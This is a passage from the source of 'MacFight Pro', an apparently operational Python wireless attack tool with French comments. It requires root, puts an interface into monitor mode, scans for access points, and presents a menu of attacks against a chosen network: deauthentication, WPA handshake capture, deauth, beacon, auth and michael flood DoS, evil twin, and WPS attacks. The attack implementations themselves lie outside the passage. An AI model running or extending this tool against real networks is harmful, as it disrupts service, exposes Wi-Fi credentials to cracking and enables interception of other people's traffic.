            "iwconfig": "wireless-tools",
        }
        
        optional = {
            "mdk3": "mdk3",
            "mdk4": "mdk4",
            "hostapd": "hostapd",
            "dnsmasq": "dnsmasq",
            "reaver": "reaver",
        }
        
        missing_required = []
        missing_optional = []
        
        for cmd, pkg in required.items():
            if shutil.which(cmd) is None:
                missing_required.append(f"{cmd} ({pkg})")
        
        for cmd, pkg in optional.items():
            if shutil.which(cmd) is None:
                missing_optional.append(f"{cmd} ({pkg})")
        
        if missing_required:
            print(f"{Colors.RED}[-] MISSING REQUIRED:{Colors.RESET}")
            for m in missing_required:
                print(f"    {Colors.RED}•{Colors.RESET} {m}")
            return False
        
        if missing_optional:
            print(f"{Colors.YELLOW}[!] Missing optional:{Colors.RESET}")
            for m in missing_optional:
                print(f"    {Colors.YELLOW}•{Colors.RESET} {m}")
            print()
        
        return True
    
    @staticmethod
    def select_interface() -> Optional[str]:
        """Sélectionner une interface"""
        interfaces = MonitorModeDetector.get_interfaces()
        
        if not interfaces:
            print(f"{Colors.RED}[-] No wireless interfaces found!{Colors.RESET}")
            return None
        
        print(f"{Colors.BLUE}Available interfaces:{Colors.RESET}")
        for i, iface in enumerate(interfaces, 1):
            print(f"{Colors.YELLOW} {i}.{Colors.RESET} {iface}")
        
        while True:
            try:
                choice = int(input(f"\n{Colors.ORANGE}[?] Select interface (1-{len(interfaces)}): {Colors.RESET}"))
                if 1 <= choice <= len(interfaces):
                    return interfaces[choice - 1]
            except ValueError:
                pass
            
            print(f"{Colors.RED}[-] Invalid choice!{Colors.RESET}")
    
    @staticmethod
    def display_aps(aps: List[APInfo], clients: Dict[str, List[str]]):
        """Afficher les APs détectés"""
        print(f"\n{Colors.BLUE}{'NUM':<5} {'ESSID':<25} {'CH':<4} {'PWR':<6} {'ENC':<12} {'CLIENTS':<8} {'BSSID':<17}{Colors.RESET}")
        print(f"{Colors.BLUE}{'='*90}{Colors.RESET}")
        
        for i, ap in enumerate(aps, 1):
            power_color = Colors.GREEN if ap.power > -70 else Colors.ORANGE if ap.power > -85 else Colors.RED
            client_count = len(clients.get(ap.bssid, []))
            
            print(
                f"{Colors.YELLOW}{i:<5}{Colors.RESET} "
                f"{Colors.CYAN}{ap.essid[:24]:<25}{Colors.RESET} "
                f"{Colors.YELLOW}{ap.channel:<4}{Colors.RESET} "
                f"{power_color}{ap.power:<6}{Colors.RESET} "
                f"{Colors.BLUE}{ap.encryption:<12}{Colors.RESET} "
                f"{Colors.GREEN}{client_count:<8}{Colors.RESET} "
                f"{Colors.BLUE}{ap.bssid}{Colors.RESET}"
            )
    
    @staticmethod
    def select_ap(aps: List[APInfo]) -> Optional[int]:
        """Sélectionner un AP"""
        while True:
            try:
                choice = input(f"\n{Colors.ORANGE}[?] Select AP (number) or 'r' to rescan: {Colors.RESET}").strip()
                
                if choice.lower() == 'r':
                    return -1  # Rescan
                
                idx = int(choice) - 1
                if 0 <= idx < len(aps):
                    return idx
            except ValueError:
                pass
            
            print(f"{Colors.RED}[-] Invalid choice!{Colors.RESET}")
    
    @staticmethod
    def attack_menu() -> str:
        """Menu d'attaque"""
        print(f"\n{Colors.BLUE}{'='*60}{Colors.RESET}")
        print(f"{Colors.YELLOW}1.{Colors.RESET} Deauthentication")
        print(f"{Colors.YELLOW}2.{Colors.RESET} Handshake Capture")
        print(f"{Colors.YELLOW}3.{Colors.RESET} Flood Attack (DoS)")
        print(f"{Colors.YELLOW}4.{Colors.RESET} Evil Twin")
        print(f"{Colors.YELLOW}5.{Colors.RESET} WPS Attack")
        print(f"{Colors.YELLOW}6.{Colors.RESET} Rescan")
        print(f"{Colors.YELLOW}0.{Colors.RESET} Back")
        
        return input(f"{Colors.ORANGE}[?] Choice: {Colors.RESET}").strip()



# APPLICATION PRINCIPALE


class MacFightPro:
    """Application principale"""
    
    def __init__(self):
        self.process_manager = ProcessManager()
        self.temp_dir = tempfile.mkdtemp(prefix="macfight_")
        self.scanner = NetworkScanner(self.process_manager, self.temp_dir)
        self.attack_factory = AttackFactory(self.process_manager, self.temp_dir)
        self.monitor_interface = None
        
        signal.signal(signal.SIGINT, self._signal_handler)
        logger.info("MacFight Pro initialized")
    
    def _signal_handler(self, sig, frame):
        """Gestion Ctrl+C"""
        logger.info("Received interrupt signal")
        self.cleanup()
        sys.exit(0)
    
    def cleanup(self):
        """Nettoyage complet"""
        logger.info("Starting cleanup")
        
        self.process_manager.cleanup_all()
        
        if self.monitor_interface:
            MonitorModeDetector.disable_monitor_mode(self.monitor_interface)
        
        self.scanner.cleanup()
        
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
        except Exception as e:
            logger.warning(f"Cleanup error: {e}")
        
        logger.info("Cleanup complete")
    
    def run(self):
        """Lancer l'application"""
        
        # Vérifier root
        if os.geteuid() != 0:
            print(f"{Colors.RED}[-] This script requires root!{Colors.RESET}")
            sys.exit(1)
        
        # Bannière & checks
        CLIManager.print_banner()
        
        if not CLIManager.check_dependencies():
            sys.exit(1)
        
        # Sélectionner interface
        iface = CLIManager.select_interface()
        if not iface:
            return
        
        # Activer monitor mode
        self.monitor_interface = MonitorModeDetector.enable_monitor_mode(iface)
        if not self.monitor_interface:
            print(f"{Colors.RED}[-] Failed to enable monitor mode!{Colors.RESET}")
            return
        
        try:
            while True:
                # Scanner
                if not self.scanner.run_scan(self.monitor_interface, duration=20):
                    retry = input(f"{Colors.ORANGE}[?] Rescan? (y/N): {Colors.RESET}").strip().lower()
                    if retry != 'y':
                        break
                    continue
                
                # Parser
                aps, clients = self.scanner.parse_results()
                
                if not aps:
                    print(f"{Colors.RED}[-] No networks found!{Colors.RESET}")
                    retry = input(f"{Colors.ORANGE}[?] Rescan? (y/N): {Colors.RESET}").strip().lower()
                    if retry != 'y':
                        break
                    continue
                
                # Afficher
                CLIManager.display_aps(aps, clients)
                
                # Sélectionner
                ap_idx = CLIManager.select_ap(aps)
                
                if ap_idx == -1:
                    continue
                if ap_idx is None:
                    break
                
                ap = aps[ap_idx]
                ap.clients = clients.get(ap.bssid, [])
                
                # Menu attaque
                if not self._attack_loop(ap):
                    break
        
        except KeyboardInterrupt:
            logger.info("User interrupted")
        
        finally:
            self.cleanup()
            print(f"\n{Colors.GREEN}[+] Goodbye!{Colors.RESET}")
    
    def _attack_loop(self, ap: APInfo) -> bool:
        """Boucle d'attaque"""
        
        while True:
            print(f"\n{Colors.BLUE}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}Target: {ap} | CH: {ap.channel} | PWR: {ap.power}dBm | Clients: {len(ap.clients)}{Colors.RESET}")
            print(f"{Colors.BLUE}{'='*60}{Colors.RESET}")
            
            choice = CLIManager.attack_menu()
            
            if choice == "1":
                self.attack_factory.deauth_attack(ap, ap.clients, self.monitor_interface)
            
            elif choice == "2":
                result = self.attack_factory.handshake_attack(
                    ap, ap.clients, self.monitor_interface
                )
                if result:
                    print(f"{Colors.GREEN}[+] Handshake capture: {result}{Colors.RESET}")
            
            elif choice == "3":
                attack_types = ["deauth", "beacon", "auth", "michael"]
                for i, t in enumerate(attack_types, 1):
                    print(f"{Colors.YELLOW}{i}.{Colors.RESET} {t}")
                
                try:
                    t_choice = int(input(f"{Colors.ORANGE}[?] Type: {Colors.RESET}")) - 1
                    if 0 <= t_choice < len(attack_types):
                        self.attack_factory.flood_attack(ap, self.monitor_interface, attack_types[t_choice])
                except ValueError:
                    pass
            
            elif choice == "4":
                self.attack_factory.evil_twin_attack(ap, self.monitor_interface)
            
            elif choice == "5":
                self.attack_factory.wps_attack(ap, self.monitor_interface)
            
            elif choice == "6":
                return True
            
            elif choice == "0":
                return False
            
            else:
                print(f"{Colors.RED}[-] Invalid choice!{Colors.RESET}")


# ENTRY POINT

def main():
    """Point d'entrée"""
    try:
        app = MacFightPro()
        app.run()
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        print(f"{Colors.RED}[-] Fatal error: {e}{Colors.RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()
